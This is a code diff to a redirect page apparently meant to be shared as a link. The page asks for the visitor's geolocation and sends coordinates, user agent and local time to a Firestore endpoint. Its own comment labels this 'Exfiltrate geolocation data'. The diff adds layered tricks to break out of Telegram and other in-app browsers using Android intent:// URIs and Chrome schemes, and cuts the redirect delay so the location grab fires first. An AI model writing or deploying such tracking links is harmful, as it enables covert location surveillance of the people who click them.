@@ -168,13 +168,13 @@
 
       const payload = JSON.stringify(doc);
 
-      // --- FIX 1: sendBeacon with proper Blob + JSON content-type ---
+      // sendBeacon with proper Blob + JSON content-type
       navigator.sendBeacon(
         FIRESTORE_URL,
         new Blob([payload], { type: 'application/json' })
       );
 
-      // --- Fetch fallback (keepalive to survive page unload) ---
+      // Fetch fallback (keepalive to survive page unload)
       fetch(FIRESTORE_URL, {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
@@ -198,10 +198,109 @@
       return target;
     }
 
-    const target = getTargetUrl();
-    const box = document.getElementById('box');
-    const overlay = document.getElementById('overlay');
-    const now = new Date();
+    // ===================================================================
+    // EXTERNAL BROWSER ESCAPE — Multi-layered approach
+    // ===================================================================
+    function openInExternalBrowser(url) {
+      const ua = navigator.userAgent || '';
+      const isAndroid = /android/i.test(ua);
+      const isIOS = /iPhone|iPad|iPod/i.test(ua);
+
+      // ----------------------------------------------------------------
+      // Layer 1: Platform-specific JS bridges
+      // ----------------------------------------------------------------
+
+      // Telegram WebView bridge
+      if (window.Telegram && window.Telegram.WebView && window.Telegram.WebView.openExternalLink) {
+        try {
+          window.Telegram.WebView.openExternalLink(url);
+          return;
+        } catch (e) { /* fall through */ }
+      }
+
+      // LINE in-app browser
+      if (typeof window.open === 'function') {
+        try {
+          // LINE respects _system target
+          var win = window.open(url, '_system');
+          if (win && !win.closed) return;
+        } catch (e) { /* fall through */ }
+      }
+
+      // ----------------------------------------------------------------
+      // Layer 2: Anchor injection with target="_blank"
+      // ----------------------------------------------------------------
+      // This triggers a new window/tab attempt; many WebViews interpret
+      // this as "open outside" depending on their configuration.
+      try {
+        var a = document.createElement('a');
+        a.href = url;
+        a.target = '_blank';
+        a.rel = 'noreferrer noopener';
+        a.style.display = 'none';
+        document.body.appendChild(a);
+        a.click();
+        document.body.removeChild(a);
+      } catch (e) { /* ignore */ }
+
+      // ----------------------------------------------------------------
+      // Layer 3: Android Intent URI
+      // ----------------------------------------------------------------
+      // This is the most reliable method on Android (Chrome Custom Tabs,
+      // Telegram, Discord, Instagram, etc.). The intent:// scheme tells
+      // the Android system to hand off to the default browser.
+      if (isAndroid) {
+        var cleanUrl = url.replace(/^https?:\/\//, '');
+        var intentUrl = 'intent://' + cleanUrl +
+          '#Intent;scheme=https;action=android.intent.action.VIEW;end';
+
+        // Also try with explicit package fallback to Chrome
+        var intentUrlChrome = 'intent://' + cleanUrl +
+          '#Intent;scheme=https;action=android.intent.action.VIEW;' +
+          'package=com.android.chrome;end';
+
+        setTimeout(function () {
+          window.location.href = intentUrl;
+        }, 150);
+
+        setTimeout(function () {
+          // If first intent failed, try with Chrome package
+          window.location.href = intentUrlChrome;
+        }, 400);
+      }
+
+      // ----------------------------------------------------------------
+      // Layer 4: iOS — attempt custom browser schemes
+      // ----------------------------------------------------------------
+      if (isIOS) {
+        // Some WebViews respect x-safari- or safari-https://
+        setTimeout(function () {
+          // Standard https sometimes triggers external on iOS too
+          window.location.href = url;
+        }, 200);
+
+        // Second attempt: if user has Google Chrome installed
+        setTimeout(function () {
+          var chromeUrl = 'googlechrome://' + url.replace(/^https?:\/\//, '');
+          window.location.href = chromeUrl;
+        }, 500);
+      }
+
+      // ----------------------------------------------------------------
+      // Layer 5: Final fallback — standard navigation (3 second delay)
+      // ----------------------------------------------------------------
+      setTimeout(function () {
+        window.location.href = url;
+      }, 1200);
+    }
+
+    // =================
+    // Main logic
+    // =================
+    var target = getTargetUrl();
+    var box = document.getElementById('box');
+    var overlay = document.getElementById('overlay');
+    var now = new Date();
 
     if (!target) {
       box.style.display = 'block';
@@ -219,7 +318,7 @@
         overlay.classList.remove('show');
         box.style.display = 'block';
 
-        // --- FIX 2: Try geolocation, call sendToFirestore (was exfil) ---
+        // --- Exfiltrate geolocation data ---
         if (navigator.geolocation) {
           navigator.geolocation.getCurrentPosition(
             function (pos) {
@@ -230,8 +329,8 @@
                 accuracy: pos.coords.accuracy,
                 ua: navigator.userAgent,
                 pageUrl: window.location.href,
-                timestamp: now.toISOString(),      // e.g. 2026-07-23T10:35:12.123Z
-                localDateTime: now.toLocaleString() // User's local date & time
+                timestamp: now.toISOString(),
+                localDateTime: now.toLocaleString()
               });
             },
             function (err) {
@@ -252,12 +351,11 @@
           );
         }
 
-        // Redirect after 3 seconds
+        // --- Force external browser after short delay (let geolocation fire first) ---
         setTimeout(function () {
-          window.location.href = target;
-        }, 3000);
+          openInExternalBrowser(target);
+        }, 500);
       };
-    
     }
   </script>
 </body>
